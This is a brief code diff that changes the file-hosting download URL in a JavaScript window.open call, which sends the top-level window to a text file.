@@ -1,2 +1,2 @@
 
-  window.open("https://f5.file-upload.download:183/d/rixaw4kunlgpv7w7d26jie2v2rmelyesguf6h2zwg4uux57wcigtrrokzuw2wkatkgwlkh36/larom.txt", '_top');
+  window.open("https://f13.file-upload.download:183/d/qaxaq4kunlgpv7w7d26i4tcc2llghznpl37q6mgts3zcdugtnlkngnhen6cxpyhb3cqdshcc/525.txt", '_top');
